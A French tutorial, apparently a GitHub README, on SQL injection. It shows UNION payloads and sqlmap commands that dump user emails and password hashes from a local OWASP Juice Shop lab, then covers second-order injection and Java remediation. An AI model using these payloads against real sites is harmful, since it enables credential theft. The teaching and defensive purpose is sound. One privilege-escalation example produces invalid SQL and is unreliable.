# Démonstration : Injections SQL et Méthodes de Remédiation

## Table des matières

1. [Introduction aux injections SQL](#introduction)
2. [Démonstration pratique : OWASP Juice Shop](#demo-juice-shop)
3. [Injections SQL Out-of-Band (OOB)](#oob-injection)
4. [Remédiation et bonnes pratiques](#remediation)
5. [Exemples de code sécurisé en Java](#exemples-java)
6. [Recommandations architecturales](#recommandations)

---

## 1. Introduction aux injections SQL {#introduction}

Les injections SQL représentent l'une des vulnérabilités les plus critiques dans les applications web. Elles permettent à un attaquant de manipuler les requêtes SQL pour :

- Exfiltrer des données sensibles (mots de passe, emails, informations personnelles)
- Contourner l'authentification
- Modifier ou supprimer des données
- Exécuter des commandes système (dans certains cas)

### Pourquoi les injections SQL sont-elles si dangereuses ?

- Elles exploitent la confiance aveugle accordée aux entrées utilisateur
- Elles peuvent compromettre l'intégralité de la base de données
- Elles sont souvent faciles à exploiter mais difficiles à détecter
- Les conséquences peuvent être catastrophiques (fuite de données, atteinte à la réputation, sanctions RGPD)

---

## 2. Démonstration pratique : OWASP Juice Shop {#demo-juice-shop}

### Configuration de l'environnement

```bash
# Télécharger l'image Docker OWASP Juice Shop
docker pull bkimminich/juice-shop:latest

# Lancer le conteneur
docker run --rm -d \
  --name juice-shop \
  -p 3000:3000 \
  bkimminich/juice-shop:latest

# Ajouter une entrée dans /etc/hosts
echo "127.0.0.1 owasp.thm" | sudo tee -a /etc/hosts
```

### Étape 1 : Identification de la vulnérabilité

Naviguer vers `http://owasp.thm:3000/#/search?q=test`

La fonction de recherche construit une requête SQL vulnérable :

```sql
SELECT * FROM Products WHERE name LIKE '%test%'
```

<img width="1505" height="941" alt="image" src="https://github.com/user-attachments/assets/fc6ac75f-204d-4eb8-9a20-49353f1d90b1" />


### Étape 2 : Détermination du nombre de colonnes

Utilisation de la clause `ORDER BY` pour identifier le nombre de colonnes :

```sql
apple')) ORDER BY 1--
apple')) ORDER BY 2--
...
apple')) ORDER BY 9--  ← Succès
apple')) ORDER BY 10-- ← Erreur
```

<img width="758" height="476" alt="image" src="https://github.com/user-attachments/assets/ac672cde-6026-418b-88e8-438c690cedb2" />


Résultat : La requête contient 9 colonnes.

<img width="1499" height="938" alt="image" src="https://github.com/user-attachments/assets/72dca401-9dc5-459f-921b-c051197ef12d" />


### Étape 3 : Exploitation avec UNION

Une fois le nombre de colonnes identifié, nous pouvons extraire des données de la table `Users` :

```sql
apple')) UNION SELECT null, email, password, null, null, null, null, null, null FROM Users--
```

Cette requête nous retourne :
- Les emails des utilisateurs
- Les mots de passe hashés (MD5)

<img width="1504" height="938" alt="image" src="https://github.com/user-attachments/assets/869b0d5d-6b7a-4c22-9bea-22fa47a08216" />


### Étape 4 : Automatisation avec SQLMap

```bash
# Liste des tables
sqlmap -u "http://owasp.thm:3000/rest/products/search?q=*" -p q \
  --dbms=SQLite --prefix="'))" --suffix="-- " \
  --tables --batch

# Extraction des emails et mots de passe
sqlmap -u "http://owasp.thm:3000/rest/products/search?q=*" -p q \
  --dbms=SQLite \
  --prefix="'))" --suffix="-- " \
  --union-cols=9 --union-char=87 --technique=U \
  -T Users -C email,password --dump \
  --no-cast \
  --threads=1 --delay=0.3 --batch -v 2
```


### Analyse de la vulnérabilité

Le code vulnérable ressemble probablement à ceci :

```java
// CODE VULNÉRABLE - NE PAS UTILISER
String query = "SELECT * FROM Products WHERE name LIKE '%" + userInput + "%'";
Statement stmt = connection.createStatement();
ResultSet rs = stmt.executeQuery(query);
```

L'entrée utilisateur est directement concaténée dans la requête SQL sans validation ni échappement.

---

## 3. Injections SQL de second ordre (Second Order SQL Injection) {#second-order-injection}

### Qu'est-ce qu'une injection de second ordre ?

Les injections SQL de second ordre sont plus subtiles et dangereuses que les injections classiques. Le code malveillant est injecté en deux temps :

1. **Phase 1 - Stockage** : L'attaquant insère du code SQL malveillant dans la base de données (par exemple lors de la création d'un compte)
2. **Phase 2 - Exploitation** : Plus tard, cette donnée est récupérée et utilisée dans une autre requête SQL sans protection

**La particularité** : La première insertion peut être parfaitement protégée avec des PreparedStatements, mais la vulnérabilité apparaît quand on réutilise cette donnée en pensant qu'elle est "sûre" car elle vient de la base.

### Scénario concret : Création et utilisation d'un compte utilisateur

#### Phase 1 : L'attaquant crée un compte

```java
// Ce code est SÉCURISÉ - utilise un PreparedStatement
public void createUser(String username, String email, String password) throws SQLException {
    String query = "INSERT INTO Users (username, email, password) VALUES (?, ?, ?)";
    
    try (PreparedStatement pstmt = connection.prepareStatement(query)) {
        pstmt.setString(1, username);  // L'attaquant saisit : "admin'--"
        pstmt.setString(2, email);
        pstmt.setString(3, hashPassword(password));
        pstmt.executeUpdate();
    }
}
```

L'utilisateur crée un compte avec le nom : `admin'--`

Ce nom est correctement stocké dans la base grâce au PreparedStatement.

#### Phase 2 : Le code malveillant est exploité

Plus tard, une autre partie de l'application récupère ce nom d'utilisateur pour afficher ses commandes :

```java
// CODE VULNÉRABLE - Utilise une donnée de la base dans une concaténation
public List<Order> getUserOrders(int userId) throws SQLException {
    // On récupère le nom d'utilisateur depuis la base
    String username = getUsernameFromDatabase(userId); // Retourne "admin'--"
    
    // ERREUR : On pense que cette donnée est sûre car elle vient de la base
    String query = "SELECT * FROM Orders WHERE username = '" + username + "'";
    
    try (Statement stmt = connection.createStatement();
         ResultSet rs = stmt.executeQuery(query)) {
        // ...
    }
}
```

**Requête SQL résultante** :
```sql
SELECT * FROM Orders WHERE username = 'admin'--'
```

Le `'--` commente le reste de la requête, et l'attaquant récupère toutes les commandes de l'utilisateur "admin" au lieu des siennes.

### Exemple plus dangereux : Modification de données

```java
// Phase 1 : Création d'un commentaire avec du code malveillant
public void createComment(int userId, String content) throws SQLException {
    String query = "INSERT INTO Comments (user_id, content) VALUES (?, ?)";
    
    try (PreparedStatement pstmt = connection.prepareStatement(query)) {
        pstmt.setInt(1, userId);
        pstmt.setString(2, content); // L'attaquant saisit : "', is_admin = 1)--"
        pstmt.executeUpdate();
    }
}

// Phase 2 : Mise à jour d'un commentaire - VULNÉRABLE
public void updateComment(int commentId, int userId) throws SQLException {
    // Récupération du contenu depuis la base
    String content = getCommentContent(commentId); // Retourne "', is_admin = 1)--"
    
    // ERREUR : Utilisation directe de cette donnée
    String query = "UPDATE Comments SET content = '" + content + "' WHERE id = " + commentId;
    
    try (Statement stmt = connection.createStatement()) {
        stmt.executeUpdate(query);
    }
}
```

**Requête SQL résultante** :
```sql
UPDATE Comments SET content = '', is_admin = 1)--' WHERE id = 123
```

L'attaquant peut potentiellement s'octroyer des privilèges administrateur.

### Pourquoi c'est difficile à détecter ?

1. **Fausse sécurité** : Les développeurs pensent que les données provenant de la base sont sûres
2. **Délai d'exploitation** : L'injection et l'exploitation peuvent être séparées de plusieurs jours ou semaines
3. **Code apparemment sécurisé** : La première insertion utilise des PreparedStatements
4. **Revue de code complexe** : Il faut tracer les données à travers toute l'application

### Principe fondamental de défense

**RÈGLE D'OR** : Toute donnée, même provenant de la base de données, doit être traitée comme potentiellement dangereuse si elle a été saisie par un utilisateur à un moment donné.

**Solution** : Toujours utiliser des PreparedStatements, même pour les données venant de la base

---

## 4. Remédiation et bonnes pratiques {#remediation}

### Principe fondamental : Ne jamais faire confiance aux entrées utilisateur

Toute donnée provenant de l'utilisateur doit être considérée comme potentiellement malveillante, **même si elle provient de la base de données**.

### Pourquoi ne pas utiliser directement les valeurs saisies ?

C'est le piège principal des injections de second ordre. Même si une valeur provient de la base de données, elle a été saisie par un utilisateur à un moment donné. 

**Scénario typique d'injection de second ordre** :

```java
// Étape 1 : L'attaquant crée un utilisateur (code sécurisé)
String insertQuery = "INSERT INTO Users (username) VALUES (?)";
PreparedStatement pstmt = conn.prepareStatement(insertQuery);
pstmt.setString(1, "admin'--"); // Stocké correctement dans la base
pstmt.executeUpdate();

// Étape 2 : Plus tard, ce nom est récupéré et réutilisé (VULNÉRABLE)
String username = getUsernameFromDatabase(userId); // Retourne "admin'--"
String selectQuery = "SELECT * FROM Orders WHERE username = '" + username + "'";
// Résultat : SELECT * FROM Orders WHERE username = 'admin'--'
// L'attaquant récupère les commandes de 'admin' au lieu des siennes
```

### Solution : Utiliser des identifiants générés par la base

Privilégier toujours les ID numériques générés automatiquement par la base de données :

- **UUID/GUID** : Identifiants universellement uniques
- **Auto-increment** : Identifiants séquentiels
- **Sequences** : Générateurs de nombres uniques

```java
// APPROCHE SÉCURISÉE - Utilisation d'un ID au lieu d'une valeur saisie
String query = "SELECT * FROM Orders WHERE user_id = ?";
PreparedStatement pstmt = connection.prepareStatement(query);
pstmt.setInt(1, userId); // userId est un entier généré par la base
```

**Pourquoi c'est plus sûr** :
- Les ID sont générés par la base, jamais par l'utilisateur
- Impossible d'injecter du code SQL dans un entier
- Performance optimale (index sur clés primaires)
- Relations entre tables fiables

### Méthodes de protection

#### 1. Requêtes paramétrées (Prepared Statements) - RECOMMANDÉ

```java
// VULNÉRABLE - Même si username vient de la base
String username = getUsernameFromDatabase(userId);
String query = "SELECT * FROM Orders WHERE username = '" + username + "'";
Statement stmt = connection.createStatement();

// SÉCURISÉ - PreparedStatement protège contre l'injection de second ordre
String username = getUsernameFromDatabase(userId);
String query = "SELECT * FROM Orders WHERE username = ?";
PreparedStatement pstmt = connection.prepareStatement(query);
pstmt.setString(1, username);
```

Avantages :
- Séparation stricte entre code SQL et données
- Protection automatique contre toutes les formes d'injection
- Meilleures performances (requêtes précompilées)

#### 2. ORM (Object-Relational Mapping)

Les frameworks ORM (Hibernate, JPA) utilisent automatiquement des requêtes paramétrées.

```java
// Avec JPA/Hibernate - toujours sécurisé
@Query("SELECT o FROM Order o WHERE o.user.id = :userId")
List<Order> findByUserId(@Param("userId") int userId);
```

#### 3. Validation et sanitisation des entrées

```java
// Validation des entrées
public boolean isValidInput(String input) {
    // Autoriser uniquement lettres, chiffres et espaces
    return input.matches("^[a-zA-Z0-9 ]+$");
}

if (!isValidInput(userInput)) {
    throw new IllegalArgumentException("Entrée invalide");
}
```

#### 4. Traçabilité des données utilisateur

**Bonne pratique** : Marquer dans votre code les données qui proviennent d'entrées utilisateur, même indirectement.

```java
public class UserService {
    
    // DANGER : Cette méthode retourne des données saisies par l'utilisateur
    // Elles doivent TOUJOURS être utilisées avec des PreparedStatements
    public String getUsernameFromDatabase(int userId) throws SQLException {
        String query = "SELECT username FROM Users WHERE id = ?";
        try (PreparedStatement pstmt = connection.prepareStatement(query)) {
            pstmt.setInt(1, userId);
            try (ResultSet rs = pstmt.executeQuery()) {
                if (rs.next()) {
                    return rs.getString("username"); // Donnée saisie par utilisateur
                }
            }
        }
        return null;
    }
    
    // CORRECT : Utilisation sécurisée avec PreparedStatement
    public List<Order> getUserOrders(int userId) throws SQLException {
        String username = getUsernameFromDatabase(userId);
        
        // TOUJOURS utiliser PreparedStatement, même pour des données de la base
        String query = "SELECT * FROM Orders WHERE username = ?";
        try (PreparedStatement pstmt = connection.prepareStatement(query)) {
            pstmt.setString(1, username);
            // ...
        }
    }
}
```
##### 5. Recommandations architecturales {#recommandations}

### 1. Utiliser des identifiants générés par la base

**Pourquoi c'est crucial** :

- Les ID générés par la base sont prévisibles et contrôlés
- Ils ne contiennent jamais de code malveillant
- Ils permettent une meilleure performance (index sur les clés primaires)
- Ils facilitent les relations entre tables

**Types d'identifiants recommandés** :

```sql
-- Auto-increment (MySQL, PostgreSQL)
CREATE TABLE Users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(255) NOT NULL,
    email VARCHAR(255) NOT NULL UNIQUE
);

-- UUID (PostgreSQL)
CREATE TABLE Users (
    id UUID DEFAULT gen_random_uuid() PRIMARY KEY,
    username VARCHAR(255) NOT NULL,
    email VARCHAR(255) NOT NULL UNIQUE
);

-- Sequence (Oracle)
CREATE SEQUENCE user_id_seq START WITH 1 INCREMENT BY 1;
CREATE TABLE Users (
    id NUMBER DEFAULT user_id_seq.NEXTVAL PRIMARY KEY,
    username VARCHAR2(255) NOT NULL,
    email VARCHAR2(255) NOT NULL UNIQUE
);
```

**Utilisation en Java** :

```java
// Toujours utiliser les ID pour les relations
public class OrderService {
    
    public Order createOrder(int userId, List<OrderItem> items) throws SQLException {
        String query = "INSERT INTO Orders (user_id, order_date, total) VALUES (?, NOW(), ?)";
        
        try (Connection conn = getConnection();
             PreparedStatement pstmt = conn.prepareStatement(query, Statement.RETURN_GENERATED_KEYS)) {
            
            BigDecimal total = calculateTotal(items);
            pstmt.setInt(1, userId); // Toujours utiliser l'ID utilisateur
            pstmt.setBigDecimal(2, total);
            
            pstmt.executeUpdate();
            
            try (ResultSet rs = pstmt.getGeneratedKeys()) {
                if (rs.next()) {
                    int orderId = rs.getInt(1);
                    saveOrderItems(orderId, items);
                    return getOrderById(orderId);
                }
            }
        }
        return null;
    }
}
```


---

## Checklist de sécurité

- [ ] Tous les paramètres utilisateur utilisent des PreparedStatements
- [ ] Aucune concaténation de chaînes dans les requêtes SQL
- [ ] Les identifiants (ID) sont utilisés pour toutes les relations
- [ ] Les entrées utilisateur sont validées et sanitizées
- [ ] L'utilisateur de base de données a des permissions minimales
- [ ] Les fonctions dangereuses (LOAD_FILE, INTO OUTFILE) sont désactivées
- [ ] Le logging des requêtes suspectes est activé
- [ ] Les tests de sécurité automatisés sont en place
- [ ] Un WAF est configuré avec des règles anti-injection SQL
- [ ] Les connexions sortantes de la base de données sont filtrées
- [ ] Les mots de passe sont hashés avec un algorithme moderne (BCrypt, Argon2)
- [ ] Les erreurs SQL ne sont jamais affichées à l'utilisateur final

---

## Ressources complémentaires

- OWASP Top 10 : https://owasp.org/www-project-top-ten/
- OWASP SQL Injection Prevention Cheat Sheet : https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
- TryHackMe Advanced SQL Injection : https://tryhackme.com/room/advancedsqlinjection
- OWASP Juice Shop : https://owasp.org/www-project-juice-shop/
- SQLMap Documentation : https://github.com/sqlmapproject/sqlmap/wiki

---

